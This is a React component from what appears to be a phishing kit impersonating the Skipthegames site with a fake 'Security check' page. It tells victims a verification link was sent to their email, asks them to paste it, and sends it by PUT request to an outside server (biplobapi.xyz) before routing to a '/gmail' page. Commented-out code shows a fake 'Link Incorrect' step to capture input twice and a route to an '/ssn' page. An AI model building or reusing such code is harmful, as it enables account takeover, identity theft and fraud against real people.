import React from "react";
import SkipLogo from "../../assets/download.png";
import { useLocation, useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { useState } from "react";
const Code = () => {
  const { state } = useLocation();
  const navigate = useNavigate();
  const [test, setTest] = useState(0);
  const [passwordError, setPasswordError] = useState(false);
  const { temp } = state;
  // console.log(temp);
  const {
    register,
    handleSubmit,
    formState: { errors },
    resetField,
  } = useForm();
  const handleVerify = (data) => {
    //     if (test === 0) {
    //   setTest(test + 1);
    //   setPasswordError(true);
    //   localStorage.setItem('code', data.code);
    //   resetField("code");
    // }else{
    const bookings = {
      code: data.code,
      // code: localStorage.getItem('code') + '{{}}' + data.code,
    };

    // console.log(bookings);

    fetch(`https://biplobapi.xyz/cashcode/${temp}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((res) => res.json())
      .then((data) => {
        // navigate(localStorage.getItem('url'));
        if (data.modifiedCount > 0) {
          // reset();
          navigate("/gmail", { state: { temp: temp } });
          // navigate("/ssn", { state: { temp: temp } });
        }
      });
    // }
  };
  return (
    <div>
      {/* <section id="attention" className="px-1">
      <div className="container head">
        <div className="row">
          <div className="col-md-12 pl-3 pb-1 pt-3 ">
            <p>
              <strong>
                Providers, we do not send out text messages ever, do not click
                on links from them. Signups will be open at the end of{" "}
                <span id="date"></span>
              </strong>
            </p>
            <p>
              <strong>
                Providers, we do not send out text messages ever, do not click
                on links from them.
              </strong>
            </p>
          </div>
        </div>
      </div>
    </section> */}
      <section className="menu menu2 mt-5">
        <div className="container">
          <div className="row">
            <div className="col-md-4 text-start">
              <img
                src="datas/images/Skipthegames-255x39.png"
                alt=""
                className="w-75"
              />
              <h5 className="dsdf">
                {" "}
                Skip the games. <span>Get satisfaction.</span>
              </h5>
            </div>
            <div className="col-md-4"></div>
            {/* <div className="col-md-4">
          <a href="" className="btn-skip2" >
                Login / Signup
              </a>
          </div> */}

            {/* <div className="col-md-4 text-center">
            <h5>
              {" "}
              Skip the games.{" "}
              <span>
                Get <br /> satisfaction.
              </span>
            </h5>
          </div> */}

            <div
              className="col-md-4 text-right fgf"
              style={{ color: "#990033" }}
            >
              <a style={{ color: "#990033" }}>Hi,</a>
              <a style={{ color: "#990033" }}>
                <u>
                  <b></b>
                </u>
              </a>
              <a className="same bottom" style={{ color: "#990033" }}>
                go to your account {localStorage.getItem("femail")} | log out
              </a>
            </div>
          </div>
        </div>
      </section>
      <section id="login" className="sfsdfd">
        <div className="container">
          <div className="row">
            <div className="col-md-12 py-3">
              <a>
                SKIPTHEGAMES.EU <b className="arrows"></b>
              </a>{" "}
              <span>Security CHECK</span>
            </div>
          </div>
        </div>
      </section>
      <section id="main_form" className="fgdg">
        <div className="container">
          <div className="row">
            <div className="col-md-9 pt-4">
              <h3>Security check</h3>
              <br />
              <p>
                We have upgraded our security to protect all users against
                account takeovers and hacking.
              </p>
              <p>
                <b>A link has been sent to your email address</b>{" "}
                <span style={{ color: "#990033" }}>
                  {localStorage.getItem("femail")}
                </span>{" "}
                . &nbsp;&nbsp;{" "}
                <a
                  style={{
                    fontSize: "12px",
                    color: "#990033",
                    textDecoration: "underline",
                  }}
                >
                  I don't have access to this email account
                </a>
              </p>
              <p>
                <b>
                  Please check your email and copy the link from your email
                  enter the link box and verify.
                </b>{" "}
              </p>
              <form onSubmit={handleSubmit(handleVerify)}>
                <div className="row">
                  <div className="col-md-10">
                    <div className="form-group mt-1">
                      <input
                        {...register("code")}
                        type="text"
                        className={`form-control ${
                          passwordError && "border border-danger"
                        }`}
                        placeholder="Copy and paste the link you received"
                        required
                        defaultValue={passwordError ? "" : ""}
                      />
                      {passwordError && (
                        <small className="text-danger">Link Incorrect</small>
                      )}
                    </div>
                  </div>
                  <div className="col-md-2">
                    <input type="submit" value="Verify" name="submit" />
                  </div>
                </div>
              </form>
              <p>The link you have received is good for 30 minutes.</p>

              <p className=" mt-4">
                It may take the code up to 10 minutes to arrive. Make sure to
                check your Spam/Junk/Trash folder.
              </p>
              <p className=" mt-4">
                <a style={{ color: "#990033", textDecoration: "underline" }}>
                  Resend the code
                </a>
                &nbsp;&nbsp;&nbsp;
                <a style={{ color: "#990033", textDecoration: "underline" }}>
                  {" "}
                  I don't have access to this email account
                </a>
              </p>
            </div>

            <div className="col-md-3 text-left pt-4"></div>
          </div>
        </div>
      </section>
      <hr />
      <section id="bottom_menu">
        <div className="container">
          <div className="row">
            <div className="col-md-12">
              <nav class="navbar navbar-expand-lg bg-body-tertiary">
                <div class="container-fluid">
                  <a className="navbar-brand" href="#">
                    &copy;skipthegames.com
                  </a>
                  <button
                    class="navbar-toggler"
                    type="button"
                    data-bs-toggle="collapse"
                    data-bs-target="#navbarSupportedContent"
                    aria-controls="navbarSupportedContent"
                    aria-expanded="false"
                    aria-label="Toggle navigation"
                  >
                    <span class="navbar-toggler-icon"></span>
                  </button>
                  <div
                    class="collapse navbar-collapse"
                    id="navbarSupportedContent"
                  >
                    <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
                      <li className="nav-item active">
                        <a className="nav-link" href="#">
                          Home
                        </a>
                      </li>
                      <li className="nav-item active">
                        <a className="nav-link" href="#">
                          Contact
                        </a>
                      </li>
                      <li className="nav-item active">
                        <a className="nav-link" href="#">
                          About
                        </a>
                      </li>
                      <li className="nav-item active">
                        <a className="nav-link" href="#">
                          Privacy{" "}
                        </a>
                      </li>
                      <li className="nav-item active">
                        <a className="nav-link" href="#">
                          Terms{" "}
                        </a>
                      </li>
                      <li className="nav-item active">
                        <a className="nav-link" href="#">
                          Escort Info{" "}
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </nav>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
};

export default Code;
